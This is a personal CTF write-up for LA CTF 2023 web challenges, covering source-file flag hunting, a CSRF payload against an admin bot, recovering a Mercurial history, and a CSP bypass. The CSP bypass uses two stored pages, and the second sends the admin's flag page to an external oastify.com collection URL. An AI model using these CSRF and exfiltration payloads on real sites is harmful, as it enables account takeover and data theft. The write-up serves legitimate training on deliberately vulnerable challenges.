---
title: LA CTF 2023 - Writeup
author: H0j3n
date: 2023-02-11 00:00:00
categories: [ctf]
tags: [ctf,writeup]
render_with_liquid: false
---

This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event.

Link to archive challenges: [https://github.com/uclaacm/lactf-archive/tree/master/2023](https://github.com/uclaacm/lactf-archive/tree/master/2023)

### Category : Web

#### Web : College Tour

> Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.
>
> Link: [college-tour.lac.tf](college-tour.lac.tf)

With a simple use of the curl command, collecting all six flags from the three files, `index.html`, `index.css`, and `script.js`, becomes effortless.

```bash
└─# curl -ks https://college-tour.lac.tf/ | tr " " "\n" | tr "\"" "\n" | grep -Ev "lOsT|\!N|number_text|03LT3r" | grep -i lactf
lactf{1_j03_4}-->
lactf{2_nd_j0}
lactf{4_n3_bR}.pdf
```

```bash
└─# curl -ks https://college-tour.lac.tf/index.css | tr " " "\n" | tr "\"" "\n" | grep -Ev "lOsT|\!N|number_text|03LT3r" | grep -i lactf
lactf{3_S3phI}
```

```bash
└─# curl -ks https://college-tour.lac.tf/script.js | tr " " "\n" | tr "\"" "\n" | grep -Ev "lOsT|\!N|number_text|03LT3r" | grep -i lactf
lactf{6_AY_hi}
cookie=lactf{5_U1n_s}
```

Flag: `lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}`

#### Web : Metaverse

> Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.
>
> Link: [metaverse.lac.tf](metaverse.lac.tf)
>
> You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!

**Source Code (index.js)** : [index.js](https://raw.githubusercontent.com/uclaacm/lactf-archive/main/2023/web/metaverse/index.js)

This code defines a simple web application using the Express framework in Node.js. The application allows users to register and log in, post updates, and view other users' posts.

The code sets up the following routes:

> `/post/:id`: This route displays the content of a post with the given ID.
{: .prompt-info }
> `/`: This route requires the user to be logged in and serves static HTML content.
{: .prompt-info }
> `/login`: This route serves static HTML content for the login page.
{: .prompt-info }
> `/register`: This route handles the user registration process.
{: .prompt-info }
> `/login`: This route handles the user login process.
{: .prompt-info }

We can easily register an account and login.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web7.png)

Looking at the source code, the flag is located in `displayname` of the admin account.

```js
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
```

Also, the display name will be available at home page if they also add our `username` as a friend. Since, we can create anything for the admin to access via `https://admin-bot.lac.tf/metaverse`. Let's create a CSRF payload to send to admin to add our username as a friend.

Payload CSRF:

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://metaverse.lac.tf/friend" method="POST">
      <input type="hidden" name="username" value="admin123" />
      <input type="submit" value="Submit request" />
    </form>
 <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web1.png)

Flag : `lactf{please_metaget_me_out_of_here}`

#### Web : my-chemical-romance

> When I was... a young boy... I made a "My Chemical Romance" fanpage!
>
> Link: [my-chemical-romance.lac.tf](my-chemical-romance.lac.tf)

Inside the response, we can see it stated "Mercurial-SCM".

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web2.png)

> `Mercurial`: is a free, distributed version control system (VCS) that provides fast and efficient handling of source code and other development files. It is commonly known as Mercurial-SCM, where "SCM" stands for "Source Code Management." Mercurial enables developers to keep track of changes to their code, collaborate with others, and maintain multiple versions of their codebase
{: .prompt-info }

Let's first install `mercurial (hg)` 

```
sudo apt-get install mercurial
```

We can easily `clone` a repository using `hg` command.

```
hg clone https://my-chemical-romance.lac.tf/ dump
```

When we see the log using `hg log -v`, we can see changeset `0` and `1`

```
changeset:   1:3ecb3a79e255
tag:         tip
user:        bliutech <bensonhliu@gmail.com>
date:        Fri Feb 10 06:50:48 2023 -0800
files:       gerard_way2001.py static/index.html
description:
Decided to keep my favorite song a secret :D


changeset:   0:2445227b04cd
user:        bliutech <bensonhliu@gmail.com>
date:        Fri Feb 10 06:49:48 2023 -0800
files:       gerard_way2001.py static/404.html static/index.css static/index.html static/mcr-meme.jpeg static/my-chemical-romance.jpeg
description:
I love 'My Chemical Romance'
```

To check our current changeset, we can use `hg heads`

```
changeset:   1:3ecb3a79e255
tag:         tip
user:        bliutech <bensonhliu@gmail.com>
date:        Fri Feb 10 06:50:48 2023 -0800
summary:     Decided to keep my favorite song a secret :D
```

To change to `0` we can use `hg update -r 0`

```
# hg update -r 0
2 files updated, 0 files merged, 0 files removed, 0 files unresolved
```

Flag can be found inside the updated `gerard_way2001.py`

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web3.png)

Flag : `lactf{d0nT_6r1nk_m3rCur1al_fr0m_8_f1aSk}`

#### Web : california-state-police

> Stop! You're under arrest for making suggestive 3 letter acronyms!
> 
> Link: [california-state-police.lac.tf](california-state-police.lac.tf)
>
> Admin Bot ([https://admin-bot.lac.tf/california-state-police](https://admin-bot.lac.tf/california-state-police)) (note: the adminpw cookie is HttpOnly and SameSite=Lax)

**Source Code (index.js)** : [index.js](https://raw.githubusercontent.com/uclaacm/lactf-archive/main/2023/web/california-state-police/index.js)

One thing we know, this challenge related to CSP and how we can bypass it. The current CSP can be found either in the source code or in the response header.

```
default-src 'none'; script-src 'unsafe-inline'
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web4.png)

> `default-src 'none'`:  All types of content (scripts, images, stylesheets, etc.) are blocked from being loaded. This is a strict policy that provides a high level of security, as it prevents any malicious content from being loaded onto the page.
{: .prompt-info }

> `script-src 'unsafe-inline'`: Inline JavaScript is allowed to be executed on the page. Inline JavaScript refers to JavaScript code that is directly included in the HTML, rather than being loaded from an external file
{: .prompt-info }

Everytime we request something with `self` or `external` , we will get this error.

```js
<script src="https://california-state-police.lac.tf/report/903dfa2d-4bfe-4a00-8a08-fe0566008807"></script>
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web5.png)

But, it's possible redirect to another website. Below are the successful `javascripts` we can use.

```js
window.open("https://URL") ----> open in new tab
window.location.href="https://URL" ----> open in current tab
window.location.replace("https://URL") ----> open in current tab
window.location.assign("https://URL") ----> open in current tab
document.location = "https://URL" ----> open in current tab
```

We going to use 2 files

1. Stored an HTML that will have a form with post method and retrieve the flag
2. Stored a javascript that will get the value of the flag in file `1` and send/redirect it to the attacker URL.

**FILE 1**

```html
<!-- https://california-state-police.lac.tf/report/3f107f9c-4ffe-4fb7-a696-1175012f0d60 -->

<form id="flag-form" action="/flag" method="post">
  <button type="submit">Click Me</button>
</form>

<script>
  document.getElementById("flag-form").submit();
</script>
```

**FILE 2**

```js
<!-- https://california-state-police.lac.tf/report/27fadbd1-a53e-4cb0-b102-40e60d049a59 -->

<script>
function redirect() {
    let webs = window.open("https://california-state-police.lac.tf/report/3f107f9c-4ffe-4fb7-a696-1175012f0d60", "_blank");
    setTimeout(function() {
        let report = webs.document.documentElement.innerHTML;
        window.location ="https://uhf0hn49b3o3wmk345uavj0n0e65uvik.oastify.com/?flag="+encodeURIComponent(report);
    }, 200);
}
redirect()
</script>
```

Sending the URL of `FILE 2` to admin will get us the flag.

[](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/4_lactf2023/web6.png)

Flag : `lactf{m4yb3_g1v1ng_fr33_xss_1s_jus7_4_b4d_1d3a}`

**References**

1. [https://www.youtube.com/watch?v=1AmbQU_p5TU](https://www.youtube.com/watch?v=1AmbQU_p5TU)

#### Web : uuid hell

> UUIDs are the best! I love them (if you couldn't tell)!
> 
> Link: [https://uuid-hell.lac.tf/](https://uuid-hell.lac.tf/)

**Zip file (uuid-hell.zip)** : [uuid-hell.zip](https://github.com/uclaacm/lactf-archive/blob/main/2023/web/uuid-hell/uuid-hell.zip)


